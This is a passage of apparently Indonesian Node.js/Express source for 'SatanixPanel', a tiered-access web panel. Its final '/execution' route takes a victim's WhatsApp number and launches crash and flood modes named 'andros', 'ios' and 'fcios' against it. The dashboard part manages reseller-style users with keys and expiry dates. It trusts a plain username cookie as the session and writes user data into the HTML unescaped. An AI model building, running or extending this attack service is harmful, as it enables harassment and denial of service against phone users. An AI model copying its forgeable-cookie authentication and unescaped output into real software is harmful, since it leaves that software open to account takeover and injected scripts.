  // Owner bisa hapus semua
  users.splice(index, 1);
  saveUsers(users);
  res.sendStatus(200);
});

app.get("/dashboard", (req, res) => {
  const username = req.cookies.sessionUser;
  if (!username) return res.send("❌ Session tidak ditemukan.");

  const users = getUsers();
  const currentUser = users.find(u => u.username === username);
  if (!currentUser) return res.send("❌ User tidak valid.");

  // === Batasan akses ===
  const allowedRoles = ["owner", "admin", "vip"];
  if (!allowedRoles.includes(currentUser.role)) {
    return res.status(403).send("❌ Kamu tidak punya akses ke halaman ini.");
  }

  // === Opsi role di form Add User ===
const roleOptionsByRole = {
  vip: ["user"],
  admin: ["vip", "user"],
  owner: ["admin", "vip", "user"]
};

const roleOptionsForForm = roleOptionsByRole[currentUser.role]
  .map(role => `<option value="${role}">${role.charAt(0).toUpperCase() + role.slice(1)}</option>`)
  .join("");

const roleOptionsHTML = (selectedRole, isCurrentUserVip, userRole) => {
  // Jika yang login vip, dan user yang dirender adalah owner/admin/vip, 
  // maka dropdown hanya punya 1 pilihan "user", tapi kalau role user adalah owner/admin/vip maka tampilkan juga optionnya sebagai disabled agar tidak hilang dari tampilan.
  if (isCurrentUserVip) {
    // Jika user di data punya role owner/admin/vip, tampilkan option itu tapi disabled (tidak bisa dipilih),
    // dan juga tampilkan option user yang bisa dipilih.
    if (["owner", "admin", "vip"].includes(userRole)) {
      // Buat option sesuai role user tapi disabled
      const specialOption = `<option value="${userRole}" selected disabled>${userRole.charAt(0).toUpperCase() + userRole.slice(1)}</option>`;
      // Plus option user biasa yang bisa dipilih (tidak selected)
      const userOption = `<option value="user" ${selectedRole === "user" ? "selected" : ""}>User</option>`;
      return specialOption + userOption;
    } else {
      // Kalau role biasa (user), tampilkan cuma option user saja
      return `<option value="user" selected>User</option>`;
    }
  } else {
    // Jika bukan vip (admin/owner)
    return roleOptionsByRole[currentUser.role]
      .map(
        role =>
          `<option value="${role}" ${selectedRole === role ? "selected" : ""}>${role.charAt(0).toUpperCase() + role.slice(1)}</option>`
      )
      .join("");
  }
};

const isVip = currentUser.role === "vip";

const userRows = users
  .map((user, i) => `
    <tr class="border-b border-red-800 hover:bg-red-800 transition" data-index="${i}">
      <td contenteditable="true" class="py-2 px-4 editable" data-field="username">${user.username}</td>
      <td class="py-2 px-4">${user.key}</td>
      <td>
        <select class="bg-transparent text-red-300 border-none focus:ring-0 p-1 role-selector" data-field="role" ${
          user.role === "owner" && currentUser.role !== "owner" ? "disabled" : ""
        }>
          ${roleOptionsHTML(user.role, isVip, user.role)}
        </select>
      </td>
      <td class="py-2 px-4" contenteditable="true" data-field="deviceId">${user.deviceId || "-"}</td>
      <td class="py-2 px-4" contenteditable="true" data-field="expired">${user.expired}</td>
      <td class="py-2 px-4 flex gap-2">
        <button class="text-blue-400 hover:text-blue-600 save-btn" title="Simpan Perubahan">Simpan</button>
        <button class="text-red-400 hover:text-red-600 delete-btn" title="Hapus User">Hapus</button>
      </td>
    </tr>
  `).join("");
  res.send(`
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <title>Dashboard - SatanixPanel</title>
<meta content='width=device-width; initial-scale=1.0; maximum-scale=1.0; user-scalable=0;' name='viewport' />
<meta name="viewport" content="width=device-width" />
  <!-- TailwindCSS -->
  <script src="https://cdn.tailwindcss.com"></script>

  <!-- Font Poppins -->
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">

  <!-- Particles.js -->
  <script src="https://cdn.jsdelivr.net/npm/particles.js"></script>

  <style>
    body {
      font-family: 'Poppins', sans-serif;
    }

    td[contenteditable="true"]:focus {
      outline: 2px solid #f43f5e;
    }

    #particles-js {
      position: fixed;
      width: 100%;
      height: 100%;
      z-index: 0;
      top: 0;
      left: 0;
    }

    #mobileMenu {
  box-shadow: 0 0 20px rgba(255, 0, 0, 0.6);
}


    /* Glow effect */
    .glow-red {
      box-shadow: 0 0 15px rgba(244, 63, 94, 0.8);
    }

    .logo-glow {
  box-shadow: 0 0 25px 5px rgba(255, 0, 72, 0.7), /* glow luar */
              0 0 10px 2px rgba(255, 0, 72, 0.5); /* glow dalam */
}


  </style>
</head>
<body class="bg-black text-red-400 min-h-screen flex flex-col">
  <div id="particles-js"></div>

<!-- Navbar -->
<header class="bg-white/10 backdrop-blur-md border-b border-white/20 flex items-center justify-between px-4 h-14 fixed w-full z-50">
  <!-- Tombol burger (hanya mobile) -->
  <button id="burgerBtn" aria-label="Toggle menu"
    class="md:hidden text-red-400 hover:text-red-600 focus:outline-none flex items-center gap-1 z-50 relative">
    <svg id="burgerIcon" xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none"
         viewBox="0 0 24 24" stroke="currentColor">
      <path stroke-linecap="round" stroke-linejoin="round" d="M4 6h16M4 12h16M4 18h16" />
    </svg>
  </button>

  <h1 class="hidden md:block text-xl font-bold text-red-400">Dashboard SataniX</h1>

  <!-- Desktop nav -->
  <nav class="hidden md:flex space-x-6 text-red-300">
    <a href="#overview" class="hover:text-red-600">Profile</a>
    <a href="#users" class="hover:text-red-600">Users</a>
    <a href="#add-user" class="hover:text-red-600">Add User</a>
  </nav>
</header>

<!-- Overlay -->
<div id="overlay" class="hidden fixed inset-0 bg-black bg-opacity-50 z-40"></div>

<!-- Side Menu (mobile) -->
<nav id="mobileMenu"
     class="fixed top-0 left-0 h-full w-64 bg-black bg-opacity-90 border-r border-red-700 text-red-400 flex flex-col space-y-4 p-4 text-lg transform -translate-x-full transition-transform duration-300 ease-in-out z-50 md:hidden">
  <a href="#overview" class="hover:text-red-600" onclick="toggleMobileMenu()">Overview</a>
  <a href="#users" class="hover:text-red-600" onclick="toggleMobileMenu()">Users</a>
  <a href="#add-user" class="hover:text-red-600" onclick="toggleMobileMenu()">Add User</a>
</nav>

  <!-- Main Content -->
  <main class="mt-14 p-6 w-full space-y-8 flex flex-col items-center">

    <!-- Overview -->
    <section id="overview" class="text-white flex flex-col items-center w-full space-y-6">
      <!-- Logo -->
     <div class="w-[43%] aspect-square rounded-full overflow-hidden flex items-center justify-center logo-glow">
  <img src="/satan.jpg" 
       alt="Logo" 
       class="w-full h-full object-cover">
</div>

  <h2 class="text-2xl font-bold mb-4 w-full max-w-5xl text-red-400 text-start">Your Profile</h2>


      <!-- Info Card -->
      <div class="relative w-full max-w-5xl rounded-lg overflow-hidden shadow-lg glow-red"
       style="
       background-image: url('/satan.jpg');
       background-size: cover;
       background-position: center;
       box-shadow: 0 4px 20px rgba(255, 0, 0, 0.4), 0 0 15px rgba(255, 0, 0, 0.6);
     ">
      <div class="absolute inset-0 bg-black bg-opacity-70"></div>
        <div class="relative p-6 space-y-4">
          
          <div class="flex items-center justify-between">
            <div class="flex items-center gap-3">
              <i class="fas fa-user text-red-500"></i>
              <span><b>Username:</b></span>
            </div>
            <span class="text-sm font-mono text-white">${currentUser.username}</span>
          </div>

          <div class="flex items-center justify-between">
            <div class="flex items-center gap-3">
              <i class="fas fa-key text-red-500"></i>
              <span><b>Key:</b></span>
            </div>
            <span class="text-sm font-mono text-white">
              ${currentUser.key 
                ? (currentUser.key.includes('-') 
                    ? currentUser.key.split('-')[1] 
                    : currentUser.key).slice(0, 8) + "..."
                : "-"}
            </span>
          </div>

          <div class="flex items-center justify-between">
            <div class="flex items-center gap-3">
              <i class="fas fa-user-shield text-red-500"></i>
              <span><b>Role:</b></span>
            </div>
            <span class="text-sm font-mono text-white">${currentUser.role}</span>
          </div>

          <div class="flex items-center justify-between">
            <div class="flex items-center gap-3">
              <i class="fas fa-calendar-times text-red-500"></i>
              <span><b>Expired:</b></span>
            </div>
            <span class="text-sm font-mono text-white">
              ${new Date(currentUser.expired).toISOString().split('T')[0]}
            </span>
          </div>

        </div>
      </div>
    </section>

    <!-- Users -->
    <section id="users" class="w-full max-w-5xl">
      <h2 class="text-2xl font-bold mb-4">Users</h2>
      <div class="overflow-auto rounded border border-red-600 mb-4 glow-red">
        <table class="min-w-full text-left">
          <thead class="bg-red-800 text-red-200">
            <tr>
              <th class="py-2 px-4">Username</th>
              <th class="py-2 px-4">Key</th>
              <th class="py-2 px-4">Role</th>
              <th class="py-2 px-4">Device ID</th>
              <th class="py-2 px-4">Expired</th>
              <th class="py-2 px-4">Action</th>
            </tr>
          </thead>
          <tbody id="userTableBody">
            ${userRows}
          </tbody>
        </table>
      </div>
    </section>

    <!-- Add User -->
    <section id="add-user" class="w-full max-w-5xl">
      <h2 class="text-2xl font-bold mb-4">Add New Users</h2>
      <form id="userForm" action="/add-user" method="POST" onsubmit="sessionStorage.setItem('userAdded', 'true')" class="space-y-4 bg-red-800 p-4 rounded glow-red">
        <div>
          <label class="block text-sm">Username</label>
          <input name="username" class="w-full p-2 rounded bg-black text-white border border-red-500" required>
        </div>
        <input type="hidden" name="key" value="${crypto.randomBytes(2).toString('hex').toUpperCase()}">
        <div>
          <label class="block text-sm">Role</label>
          <select name="role" class="w-full p-2 rounded bg-black text-white border border-red-500">
            ${roleOptionsForForm}
          </select>
        </div>
        <div>
          <label class="block text-sm">Expired (timestamp)</label>
          <input name="expired" type="number" class="w-full p-2 rounded bg-black text-white border border-red-500" required>
        </div>
        <button class="bg-red-600 px-4 py-2 rounded hover:bg-red-700 text-white" type="submit">
          <i class="fas fa-plus"></i> Tambah
        </button>
      </form>
    </section>
  </main>
  <script>
  const form = document.getElementById('userForm');

  form.addEventListener('submit', function(e) {
    e.preventDefault();

    // simpan flag dulu
    sessionStorage.setItem('userAdded', 'true');

    Swal.fire({
      icon: 'success',
      title: 'User berhasil ditambahkan!',
      showConfirmButton: false,
      timer: 1500
    }).then(() => {
      // submit form setelah alert
      form.submit();
    });
  });
</script>

  <script>
const burgerBtn = document.getElementById('burgerBtn');
const mobileMenu = document.getElementById('mobileMenu');
const burgerIcon = document.getElementById('burgerIcon');
const overlay = document.getElementById('overlay');

function toggleMobileMenu() {
  mobileMenu.classList.toggle('-translate-x-full');
  overlay.classList.toggle('hidden');

  if (mobileMenu.classList.contains('-translate-x-full')) {
    // Kembali ke ikon burger
    burgerIcon.innerHTML = '<path stroke-linecap="round" stroke-linejoin="round" d="M4 6h16M4 12h16M4 18h16" />';
  } else {
    // Ganti jadi ikon X
    burgerIcon.innerHTML = '<path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12" />';
  }
}

burgerBtn.addEventListener('click', toggleMobileMenu);
overlay.addEventListener('click', toggleMobileMenu);
</script>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
<script>
document.addEventListener("DOMContentLoaded", () => {
  // Tombol hapus user
  document.querySelectorAll(".delete-btn").forEach(btn => {
    btn.addEventListener("click", () => {
      const row = btn.closest("tr");
      const index = row.dataset.index;

      Swal.fire({
        title: "Hapus User?",
        text: "Aksi ini tidak bisa dibatalkan!",
        icon: "warning",
        showCancelButton: true,
        confirmButtonColor: "#d33",
        cancelButtonColor: "#3085d6",
        confirmButtonText: "Ya, hapus!"
      }).then(async (result) => {
        if (!result.isConfirmed) return;

        const res = await fetch("/delete-user", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ index })
        });

        if (res.ok) {
          Swal.fire("Berhasil!", "User berhasil dihapus.", "success");
          row.remove();
        } else {
          const msg = await res.text();
          Swal.fire("Gagal!", msg, "error");
        }
      });
    });
  });

  // Tombol simpan perubahan
  document.querySelectorAll(".save-btn").forEach(btn => {
    btn.addEventListener("click", async () => {
      const row = btn.closest("tr");
      const index = row.dataset.index;

      const data = {
        index,
        username: row.querySelector('[data-field="username"]').innerText.trim(),
        role: row.querySelector(".role-selector").value,
        deviceId: row.querySelector('[data-field="deviceId"]').innerText.trim(),
        expired: row.querySelector('[data-field="expired"]').innerText.trim()
      };

      const res = await fetch("/edit-user", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data)
      });

      if (res.ok) {
        Swal.fire("Berhasil!", "Perubahan telah disimpan.", "success");
      } else {
        const msg = await res.text();
        Swal.fire("Gagal!", msg, "error");
      }
    });
  });
});
</script>
  </body>
  </html>
  `);
});


app.get("/execution", (req, res) => {
  const username = req.cookies.sessionUser;
  const msg = req.query.msg || "";
  const filePath = "./HCS-View/Login.html";

  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ Gagal baca file Login.html");

    if (!username) return res.send(html);

    const users = getUsers();
    const currentUser = users.find(u => u.username === username);

    if (!currentUser || !currentUser.expired || Date.now() > currentUser.expired) {
      return res.send(html);
    }

    const targetNumber = req.query.target;
    const mode = req.query.mode;
    const target = `${targetNumber}@s.whatsapp.net`;

    if (sessions.size === 0) {
      return res.send(executionPage("🚧 MAINTENANCE SERVER !!", {
        message: "Tunggu sampai maintenance selesai..."
      }, false, currentUser, "", mode));
    }

    if (!targetNumber) {
      if (!mode) {
        return res.send(executionPage("✅ Server ON", {
          message: "Pilih mode yang ingin digunakan."
        }, true, currentUser, "", ""));
      }

      if (["andros", "androse", "ios", "fcios"].includes(mode)) {
        return res.send(executionPage("✅ Server ON", {
          message: "Masukkan nomor target (62xxxxxxxxxx)."
        }, true, currentUser, "", mode));
      }

      return res.send(executionPage("❌ Mode salah", {
        message: "Mode tidak dikenali. Gunakan ?mode=andros atau ?mode=ios."
      }, false, currentUser, "", ""));
    }

    if (!/^\d+$/.test(targetNumber)) {
      return res.send(executionPage("❌ Format salah", {
        target: targetNumber,
        message: "Nomor harus hanya angka dan diawali dengan nomor negara"
      }, true, currentUser, "", mode));
    }

    try {
      if (mode === "andros") {
        fcandro(24, target);
      } else if (mode === "androse") {
        delay(24, target);
      } else if (mode === "ios") {
        iosflood(24, target);
      } else if (mode === "fcios") {
        forceios(24, target);
      } else {
        throw new Error("Mode tidak dikenal.");
      }

      return res.send(executionPage("✅ S U C C E S", {
        target: targetNumber,
        timestamp: new Date().toLocaleString("id-ID"),
        message: `𝐄𝐱𝐞𝐜𝐮𝐭𝐞 𝐌𝐨𝐝𝐞: ${mode.toUpperCase()}`
      }, false, currentUser, "", mode));
    } catch (err) {
      return res.send(executionPage("❌ Gagal kirim", {
        target: targetNumber,
        message: err.message || "Terjadi kesalahan saat pengiriman."
      }, false, currentUser, "Gagal mengeksekusi nomor target.", mode));
    }
  });
});

app.get("/logout", (req, res) => {
  res.clearCookie("sessionUser");
  res.redirect("/login");
});

app.listen(PORT, () => {
  console.log(`✅ Server aktif di port ${PORT}`);
});